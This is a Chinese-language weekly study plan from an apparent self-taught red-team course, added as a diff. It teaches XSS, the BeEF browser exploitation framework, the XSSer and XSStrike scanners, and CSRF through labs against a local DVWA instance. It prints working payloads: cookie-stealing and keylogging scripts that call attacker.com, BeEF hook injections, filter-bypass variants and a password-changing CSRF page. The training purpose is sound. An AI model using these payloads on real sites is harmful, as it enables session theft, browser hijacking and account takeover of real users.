@@ -1,0 +1,454 @@
+================================================================================
+第14周：XSS与CSRF攻击 (Web深入期)
+================================================================================
+
+【本周围绕的核心渗透案例阶段】
+以"XSS攻击链——从简单弹窗到Beef浏览器控制"为贯穿案例，学员深入学习跨站脚本(XSS)
+的三种类型（反射型、存储型、DOM型），利用Beef框架实现高级浏览器控制，结合
+xsser/xsstrike自动化扫描工具，再过渡到CSRF跨站请求伪造攻击。最后在DVWA上
+完成XSS全关卡通关并实现Beef联动实战。
+本阶段属于"Web深入期"，XSS同样是OWASP Top 10经典漏洞。
+
+【本周学习目标】
+1. 理解XSS漏洞的成因：未过滤用户输入导致恶意脚本在浏览器端执行
+2. 掌握XSS三种类型（反射型/Reflected、存储型/Stored、DOM型）的区别和利用
+3. 熟练构造XSS Payload：弹窗、Cookie窃取、重定向、表单劫持、键盘记录
+4. 掌握Beef框架的架构和使用：Hook注入、浏览器控制、模块化攻击
+5. 掌握xsser和xsstrike自动化XSS扫描和利用
+6. 理解CSRF漏洞原理：利用用户已认证身份发送伪造请求
+7. 掌握CSRF攻击链：构造恶意页面 -> 诱导点击 -> 执行未授权操作
+8. 在DVWA上完成XSS(Reflected)、XSS(Stored)、XSS(DOM)、CSRF全关卡通关
+9. 实现Beef + DVWA联动：Hook受害者浏览器并执行高级控制
+
+【本周知识清单】
+★ XSS跨站脚本攻击
+  - XSS分类：
+    * 反射型XSS(Reflected XSS)：payload在URL参数中，需诱导点击
+    * 存储型XSS(Stored XSS)：payload存储在服务器（数据库/文件），持久化
+    * DOM型XSS(DOM-Based XSS)：payload在客户端JS中动态执行，不经过服务器
+  - 常用XSS Payload：
+    * 基础弹窗：<script>alert('XSS')</script>
+    * Cookie窃取：<script>document.location='http://attacker.com/?c='+document.cookie</script>
+    * 页面重定向：<script>window.location='http://attacker.com'</script>
+    * DOM操作：<script>document.body.innerHTML='<h1>Hacked</h1>'</script>
+    * 键盘记录：<script>document.onkeypress=function(e){new Image().src='http://attacker/?k='+e.key}</script>
+    * 绕过标签过滤：<img src=x onerror=alert(1)> <svg onload=alert(1)> <body onload=alert(1)>
+    * 绕过WAF过滤：大小写混合<sCrIpT>、编码(&#x3c;)、字符串拼接(eval+concat)
+  - XSS防御：输出编码(HTML Entity)、CSP(Content Security Policy)、HttpOnly Cookie、输入验证和消毒
+
+★ Beef (Browser Exploitation Framework)
+  - Beef架构：服务端(Node.js) + 客户端JS Hook
+  - Hook代码注入方式：<script src="http://beef-server:3000/hook.js"></script>
+  - Beef面板功能：在线/离线浏览器、浏览器指纹、模块分类
+  - 命令模块分类：
+    * Browser（浏览器）：Cookie获取、重定向、检测插件、屏幕截图
+    * Chrome Extensions（Chrome扩展）：扩展开发注入
+    * Debug（调试）：错误测试
+    * Exploits（漏洞利用）：浏览器漏洞利用（需配合过时的浏览器）
+    * Host（主机）：获取主机信息、检测虚拟机
+    * IPEC（进程间通信）：检测协议处理程序
+    * Metasploit（Metasploit联动）：browser_autopwn
+    * Misc（杂项）：检测是否安装了特定软件
+    * Network（网络）：端口扫描、DNS枚举、Ping扫描
+    * Persistence（持久化）：弹出窗口保持Beef连接、iFrame技术
+    * Phonegap（移动应用）：移动设备攻击
+    * Social Engineering（社会工程学）：虚假更新弹窗、虚假登录表单
+
+★ XSSer (Cross Site "Scripter")
+  - 自动化XSS检测和利用工具
+  - GET/POST注入自动测试
+  - 绕过过滤器的多种编码选项
+  - --auto模式：自动尝试多种XSS payload
+
+★ XSStrike
+  - 高级XSS检测工具：智能payload生成、WAF检测、上下文分析
+  - 与XSSer的互补使用
+
+★ CSRF跨站请求伪造
+  - 攻击原理：利用Cookie自动携带机制
+  - 攻击条件：用户已登录目标站点 + 攻击者知道请求格式
+  - 攻击构造：HTML表单自动提交、XHR请求、<img>标签GET触发
+  - CSRF Token防护机制和绕过方法
+  - 结合XSS绕过CSRF防护的高级攻击链
+
+【本周工具清单】
+  - Beef (Browser Exploitation Framework)
+  - XSSer (自动XSS扫描器)
+  - XSStrike (高级XSS检测工具)
+  - Burp Suite (HTTP代理和分析)
+  - DVWA (靶场)
+  - ArchStrike Linux
+
+================================================================================
+周一：XSS原理（反射/存储/DOM）
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：XSS跨站脚本攻击的产生原理、三种类型详解和Payload构造
+  - XSS漏洞产生的根本原因：
+    * 用户输入被直接输出到HTML页面中，未经过滤或编码
+    * 浏览器解析HTML时执行了用户注入的JavaScript代码
+    * 同源策略(SOP)的局限性：脚本运行在受害站点的源下
+  - 反射型XSS(Reflected XSS)：
+    * 特点：payload在URL参数中，一次性触发
+    * 攻击流程：构造恶意URL -> 发送给受害者 -> 点击后触发
+    * 常见场景：搜索框、错误页面、表单回显
+    * 示例：?search=<script>alert(document.cookie)</script>
+  - 存储型XSS(Stored XSS)：
+    * 特点：payload存储在服务器端，每次访问页面都触发
+    * 攻击流程：提交恶意内容 -> 服务器存储 -> 其他用户访问时执行
+    * 常见场景：评论系统、留言板、个人资料、论坛帖子
+    * 危害最大：攻击一次，所有访问者受害
+  - DOM型XSS(DOM-Based XSS)：
+    * 特点：payload通过客户端JS修改DOM执行，不经过服务器
+    * 攻击流程：JS从URL/Referer/Window.name读取数据 -> 写入innerHTML/eval() -> 触发
+    * 常见场景：hash路由、JS模板引擎、document.write输出
+    * 检测困难：服务器日志中看不到攻击痕迹
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/05-XSS与CSRF攻击.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：在DVWA上体验反射型、存储型、DOM型XSS攻击
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/05-XSS与CSRF攻击.txt
+
+  操作步骤：
+    Step 1: DVWA安全级别设为Low
+    Step 2: 进入XSS (Reflected) 反射型XSS页面
+    Step 3: 在输入框中输入 <script>alert('XSS')</script> 并提交
+    Step 4: 观察弹窗效果，确认反射型XSS成功
+    Step 5: 输入 <script>alert(document.cookie)</script> 获取Cookie信息
+    Step 6: 构造完整攻击URL并理解反射型XSS的诱骗场景
+    Step 7: 进入XSS (Stored) 存储型XSS页面
+    Step 8: 在留言板Name和Message中分别注入: <script>alert('Stored XSS')</script>
+    Step 9: 提交后刷新页面，观察每次访问都会弹窗（证明已存储到数据库）
+    Step 10: 输入 <script>document.location='http://attacker.com/?c='+document.cookie</script> 研究Cookie窃取链
+    Step 11: 进入XSS (DOM) DOM型XSS页面
+    Step 12: 在URL参数default=后添加 <script>alert('DOM XSS')</script>
+    Step 13: 将DVWA安全级别切换为Medium，观察过滤器对三类XSS的影响
+    Step 14: 研究Medium级别下绕过过滤的变异payload（如大写、双写、HTML事件）
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周二：Beef框架使用
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：Beef (Browser Exploitation Framework) 架构和核心攻击能力
+  - Beef简介：专注于Web浏览器的渗透测试框架
+  - 核心架构：
+    * BeEF服务器（默认端口3000）：控制面板 + Hook.js托管
+    * Hook.js：注入受害者浏览器的JavaScript代码
+    * 命令模块：通过WebSocket/JHTTP向被Hook浏览器发送攻击指令
+    * 数据库：存储被Hook浏览器信息、日志、结果
+  - Hook生命周期：
+    注入Hook -> 浏览器连接BeEF -> 注册浏览器指纹 -> 等待命令 -> 执行 -> 返回结果
+  - 会话管理与持久化：
+    * 页面跳转后Hook丢失（单页面应用除外）
+    * 持久化Hook技术：弹出under-popup、iFrame、Service Worker
+  - Beef面板导航：
+    * 左侧：被Hook的浏览器列表（在线/离线指示）
+    * 右侧：浏览器详情面板（操作系统、浏览器版本、插件、内部IP）
+    * 下方 详细/日志/命令
+  - 重要攻击模块（按危害排序）：
+    * Social Engineering: Pretty Theft（盗取Facebook/Gmail凭据）
+    * Social Engineering: Google Phishing（谷歌钓鱼页面）
+    * Social Engineering: Fake Notification Bar（虚假更新通知）
+    * Browser: Hooked Domain Create Iframe（创建iframe进行隐蔽攻击）
+    * Network: Port Scanner（通过浏览器对内网进行端口扫描）
+    * Persistence: Confirm Close Tab（阻止关闭页面，保持Hook）
+    * Host: Detect Virtual Machine（检测虚拟机环境）
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/05-XSS与CSRF攻击.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：安装和配置Beef，学习基本Hook和命令模块操作
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/05-XSS与CSRF攻击.txt
+
+  操作步骤：
+    Step 1: sudo apt install beef-xss 安装Beef
+    Step 2: sudo beef-xss 或 cd /usr/share/beef-xss && sudo ./beef 启动Beef
+    Step 3: 首次运行会提示修改默认密码: sudo nano /etc/beef-xss/config.yaml
+    Step 4: 将passwd改为自定义密码, user改为自定义用户名（或使用默认）
+    Step 5: 浏览器访问 http://127.0.0.1:3000/ui/panel 打开Beef管理面板
+    Step 6: 使用配置的用户名密码登录
+    Step 7: 观察面板布局：左侧浏览器列表、右侧详细信息区
+    Step 8: 打开一个新的浏览器标签页，访问DVWA的XSS(Stored)页面
+    Step 9: 在留言中注入Beef Hook（替换为你的Beef服务器IP）:
+      <script src="http://192.168.56.1:3000/hook.js"></script>
+    Step 10: 刷新DVWA XSS存储页面，或等另一个浏览器标签页访问该页面
+    Step 11: 回到Beef面板，观察新出现被Hook的浏览器（显示IP、浏览器类型）
+    Step 12: 点击该浏览器，查看详细信息：操作系统、浏览器版本、插件、内部IP
+    Step 13: 在Command标签页中选择 Browser -> Hooked Domain -> Get Cookie
+    Step 14: 点击Execute，观察命令执行结果中的Cookie信息
+    Step 15: 尝试 Browser -> Hooked Domain -> Get Form Values（获取页面表单值）
+    Step 16: 尝试 Social Engineering -> Pretty Theft（虚假登录弹窗测试）
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周三：xsser + xsstrike自动化
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：XSS自动化检测和利用工具的原理和使用策略
+  - XSSer (Cross Site "Scripter")：
+    * 功能：自动检测XSS漏洞、自动注入payload
+    * 核心选项：
+      --all：测试所有已知的XSS payload变体
+      --auto：自动模式（自动检测和利用）
+      --Cw：编码绕过（URL编码）
+      --He：十六进制编码（HTML实体编码）
+      --Str：字符串形式编码
+      --Dc：双引号编码
+      --Doss：基本的DOS/DDOS攻击
+      --Fp：最终Payload（可以用自定义payload覆盖自动payload）
+    * 请求类型：-g（GET注入），-p（POST注入）
+    * --cookie：认证Cookie
+    * --proxy：使用代理
+  - XSStrike：
+    * 更先进的XSS检测引擎
+    * 智能payload生成（根据上下文自动构造）
+    * WAF检测和绕过
+    * 盲XSS检测
+    * HTML/JS解析器分析reflection上下文
+    * 核心参数：
+      -u：目标URL
+      --data：POST数据
+      --headers：自定义HTTP头
+      --crawl：爬取目标网站
+      --blind：盲XSS检测
+      --fuzzer：模糊测试模式
+    * 与XSSer的互补：
+      XSSer适合大量payload批量测试
+      XSStrike适合智能分析上下文和WAF绕过
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/05-XSS与CSRF攻击.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：使用xsser和xsstrike对DVWA进行自动化XSS检测和利用
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/05-XSS与CSRF攻击.txt
+
+  操作步骤：
+    Step 1: sudo apt install xsser 安装XSSer（或 git clone）
+    Step 2: xsser -h 查看XSSer帮助信息
+    Step 3: xsser --all 查看所有可用payload
+    Step 4: DVWA安全级别设为Low
+    Step 5: xsser -u "http://localhost/dvwa/vulnerabilities/xss_r/?name=" --cookie="PHPSESSID=xxx; security=low" --auto 对反射型XSS页面进行自动检测
+    Step 6: xsser -u "http://localhost/dvwa/vulnerabilities/xss_r/?name=" --cookie="PHPSESSID=xxx; security=low" -g "name=XSS" --auto 指定GET参数
+    Step 7: 分析xsser的输出报告，确认发现的XSS注入点
+    Step 8: git clone https://github.com/s0md3v/XSStrike 安装XSStrike
+    Step 9: cd XSStrike && python3 xsstrike.py -h 查看帮助
+    Step 10: python3 xsstrike.py -u "http://localhost/dvwa/vulnerabilities/xss_r/?name=test" --headers "Cookie: PHPSESSID=xxx; security=low" 使用XSStrike检测反射型XSS
+    Step 11: python3 xsstrike.py -u "http://localhost/dvwa/vulnerabilities/xss_r/?name=test" --headers "Cookie: PHPSESSID=xxx; security=low" --fuzzer 使用模糊测试模式
+    Step 12: 对存储型XSS页面进行检测（通过POST数据）:
+      python3 xsstrike.py -u "http://localhost/dvwa/vulnerabilities/xss_s/" --data "txtName=test&mtxMessage=test&btnSign=Sign+Guestbook" --headers "Cookie: PHPSESSID=xxx; security=low"
+    Step 13: 将DVWA安全级别切换为Medium，再次使用两个工具测试
+    Step 14: 对比xsser和xsstrike在不同安全级别下的检测成功率的差异
+    Step 15: 查看Burp Suite代理的请求记录，分析自动化工具发送的payload
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周四：CSRF原理与利用
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：跨站请求伪造(CSRF)攻击的原理、构造方法和防御绕过
+  - CSRF攻击原理：
+    * 利用Web应用的Cookie自动携带机制
+    * 用户在已登录状态下访问攻击者构造的恶意页面
+    * 恶意页面自动向目标站点发送请求（携带用户的认证Cookie）
+    * 目标站点无法区分请求是用户主动发起还是被伪造的
+  - CSRF攻击三要素：
+    1. 目标站点存在状态变更操作（修改密码、转账、发帖）
+    2. 用户已在目标站点认证登录
+    3. 攻击者能够构造完整的请求（知道所有请求参数）
+  - CSRF攻击构造方式：
+    * HTML表单自动提交（最常用）：
+      <form action="http://victim.com/change_password" method="POST">
+        <input name="new_password" value="attacker123">
+        <input type="submit">
+      </form>
+      <script>document.forms[0].submit();</script>
+    * <img>标签GET请求：<img src="http://victim.com/transfer?to=attacker&amount=1000">
+    * AJAX/XHR跨域（需要CORS配置错误支持）
+    * 链接诱导（GET型CSRF）
+    * 结合XSS绕过CSRF Token防护
+  - CSRF防护机制：
+    * CSRF Token：每次请求包含随机生成的唯一令牌
+    * SameSite Cookie：Strict/Lax/None控制跨站Cookie发送
+    * Referer/Origin头验证
+    * 二次验证（验证码、旧密码）
+    * 自定义请求头（X-Requested-With）
+  - CSRF Token绕过策略：
+    * Token未与用户会话正确绑定
+    * Token可重用（非一次性）
+    * Token通过Cookie而非请求体传递（Double Submit Cookie绕过）
+    * 结合XSS读取Token并构造完整请求
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/05-XSS与CSRF攻击.txt
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：在DVWA上完成CSRF攻击实验，理解攻击链和防护机制
+  参考文件：/home/a/成长为一个红队/archstrike-web教学/05-XSS与CSRF攻击.txt
+
+  操作步骤：
+    Step 1: DVWA安全级别设为Low
+    Step 2: 进入CSRF页面，观察密码修改功能
+    Step 3: 输入新密码并提交，使用Burp Suite拦截请求，分析请求格式
+    Step 4: 识别CSRF参数：password_new(新密码)、password_conf(确认密码)、Change(提交)
+    Step 5: 在本地创建一个CSRF攻击页面 csrf_attack.html:
+      <html><body>
+      <h1>恭喜你中奖了!</h1>
+      <form action="http://localhost/dvwa/vulnerabilities/csrf/" method="GET">
+        <input type="hidden" name="password_new" value="hacked123">
+        <input type="hidden" name="password_conf" value="hacked123">
+        <input type="hidden" name="Change" value="Change">
+      </form>
+      <script>document.forms[0].submit();</script>
+      </body></html>
+    Step 6: 在浏览器中打开csrf_attack.html，观察密码是否被修改为hacked123
+    Step 7: 尝试用新密码hacked123登录DVWA验证攻击成功
+    Step 8: DVWA安全级别切换为Medium
+    Step 9: 分析Medium级别的防护机制（Referer头检查）
+    Step 10: 研究绕过Medium防护的方法：将攻击页面命名为包含目标域名
+    Step 11: DVWA安全级别切换为High
+    Step 12: 分析High级别的防护机制（引入CSRF Token）
+    Step 13: 结合之前学到的XSS，思考XSS+CSRF组合攻击：
+      如果在目标站点找到XSS漏洞，可以用XSS读取CSRF Token，再配合构造完整CSRF请求
+    Step 14: 研究密码修改页面的HTML源码，寻找CSRF Token的获取方式
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周五：DVWA XSS全关卡 + Beef联动实战
+================================================================================
+
+📚 第1小时 | 理论学习 (08:00 - 09:00)
+  学习内容：XSS + Beef联动攻击链理论和DVWA XSS源码分析
+  - XSS + Beef联动攻击链：
+    发现XSS漏洞 -> 注入Beef Hook -> 受害者浏览器连接Beef -> 
+    收集浏览器指纹 -> 选择攻击模块 -> 窃取Cookie/凭据 -> 进一步控制
+  - 三种XSS注入Beef Hook的场景对比：
+    * 反射型：构造钓鱼URL诱使受害者点击
+    * 存储型：一次注入永久生效，所有访问者自动被Hook
+    * DOM型：利用客户端JS动态输出注入Hook
+  - Beef高级攻击模块深度解析：
+    * 凭证钓鱼(Pretty Theft)：仿冒Facebook/Google/YouTube登录页面
+    * 虚假更新通知(Fake Notification Bar)：诱导下载恶意"更新"
+    * 内网端口扫描(Port Scanner)：利用浏览器检测内网存活主机
+    * 浏览器Persistence：多种技术维持Hook不被断开
+    * 与Metasploit联动：browser_autopwn模块（自动浏览器漏洞利用）
+  - DVWA XSS (Reflected) 源码分析（Low/Medium/High）
+  - DVWA XSS (Stored) 源码分析（Low/Medium/High）
+  - DVWA XSS (DOM) 源码分析（Low/Medium/High）
+  - Impossible级别的正确防护方案
+
+💻 第2小时 | 动手实践 (09:00 - 10:00)
+  练习内容：DVWA XSS全关卡通关 + Beef联动完整攻击链实战
+  操作步骤：
+    Step 1: sudo beef-xss 启动Beef
+    Step 2: 浏览器访问 http://127.0.0.1:3000/ui/panel 登录Beef面板
+    Step 3: DVWA安全级别设为Low
+    Step 4: XSS (Reflected) 通关：
+      输入 <script>alert(1)</script> 弹窗成功
+      输入 <script src="http://192.168.56.1:3000/hook.js"></script> 注入Beef Hook
+      在Beef面板确认浏览器被Hook
+    Step 5: XSS (Stored) 通关 + Beef联动：
+      在留言板Name: <script>alert(1)</script> Message: <script>alert(2)</script>
+      刷新页面确认弹窗
+      修改Message为: <script src="http://192.168.56.1:3000/hook.js"></script>
+      每次打开该页面浏览器都会被Hook
+      在Beef面板中，对该浏览器执行:
+        a) Browser -> Hooked Domain -> Get Cookie (获取Cookie)
+        b) Social Engineering -> Pretty Theft -> Facebook (虚假Facebook登录测试)
+        c) Browser -> Hooked Domain -> Get Form Values (获取页面表单内容)
+        d) Network -> Port Scanner -> 扫描127.0.0.1的常用端口
+    Step 6: XSS (DOM) 通关：
+      在URL中添加 ?default=English<script>alert('DOM XSS')</script>
+      观察弹窗效果，理解DOM型XSS的执行位置
+    Step 7: DVWA安全级别切换为Medium
+    Step 8: XSS (Reflected) Medium绕过：
+      使用 <sCrIpT>alert(1)</sCrIpT> 大小写混用绕过str_replace
+      或使用 <img src=x onerror=alert(1)>
+    Step 9: XSS (Stored) Medium绕过：
+      Name字段有长度限制 -> 使用Burp修改POST数据
+      或使用简短payload: <svg onload=alert(1)>
+    Step 10: DVWA安全级别切换为High
+    Step 11: XSS (Reflected) High绕过：
+      使用非script标签的事件payload: <img src=x onerror=alert(1)>
+    Step 12: XSS (Stored) High绕过：
+      使用HTML实体编码或事件处理绕过htmlspecialchars
+    Step 13: 在Beef面板中查看所有被Hook的浏览器的日志历史
+    Step 14: 导出Beef的攻击结果记录（Logs标签页）
+
+📝 第3小时 | 复盘总结 (10:00 - 11:00)
+  - 今日收获：
+  - 遇到问题：
+  - 明日计划：
+
+================================================================================
+周六：复习日 (2h 复习 + 1h HTB/THM)
+================================================================================
+
+📝 第1小时 | 周知识点回顾 (08:00 - 09:00)
+  复习清单：
+  - XSS三种类型对比表：反射型/存储型/DOM型（触发方式、数据流向、持久性）
+  - 常用XSS Payload默写（至少10种）：script弹窗、img onerror、svg onload、body onload、iframe、a href、input autofocus、details open、video onerror、marquee
+  - Beef核心攻击模块回顾：Cookie获取、Pretty Theft、Port Scanner、Persistence
+  - CSRF攻击构造模板：HTML表单自动提交 + hidden input + JS触发
+  - XSS+CSRF组合攻击原理：XSS读取CSRF Token -> 构造带Token的CSRF请求
+
+💻 第2小时 | DVWA综合演练 (09:00 - 10:00)
+  练习内容：不参考笔记，独立完成DVWA全部XSS和CSRF关卡
+  操作步骤：
+    Step 1: Low级别：全部使用不同payload通关
+    Step 2: Medium级别：每种XSS找到至少一种绕过方法
+    Step 3: High级别：挑战更复杂的payload构造
+    Step 4: 记录每个级别的payload和绕过技巧
+
+🔓 第3小时 | HackTheBox / TryHackMe Web练习 (10:00 - 11:00)
+  练习内容：在在线平台寻找XSS相关的Web挑战
+  操作步骤：
+    Step 1: 连接HTB VPN或访问THM
+    Step 2: 在THM中搜索"XSS"房间进行系统学习
+    Step 3: 在HTB中选择包含Web挑战的靶机（如"Doctor"、"Time"等）
+    Step 4: 尝试发现XSS漏洞并进行利用
+    Step 5: 记录攻击链和获取flag的过程
+
+================================================================================
+周日：休息日
+================================================================================
+
+【本周资源清单】
+理论知识文件：
+  /home/a/成长为一个红队/archstrike-web教学/05-XSS与CSRF攻击.txt
+
+实践教程文件：
+  /home/a/成长为一个红队/archstrike-web教学/05-XSS与CSRF攻击.txt
+
+在线练习：
+  - DVWA (http://localhost/dvwa)
+  - HackTheBox Web靶机 (https://app.hackthebox.com)
+  - TryHackMe XSS房间 (https://tryhackme.com)
+  - PortSwigger Web Security Academy - XSS (https://portswigger.net/web-security/cross-site-scripting)
+  - XSS Game / XSS Challenges (https://xss-game.appspot.com / https://xss.posed.ba/)
+
+推荐工具安装：
+  - Beef (sudo apt install beef-xss)
+  - XSSer (sudo apt install xsser)
+  - XSStrike (git clone https://github.com/s0md3v/XSStrike)
+  - Burp Suite Community Edition
+
+【本周完成检查】
+[ ] 周一 [ ] 周二 [ ] 周三 [ ] 周四 [ ] 周五
+[ ] 周六复习 [ ] 笔记 [ ] 体能
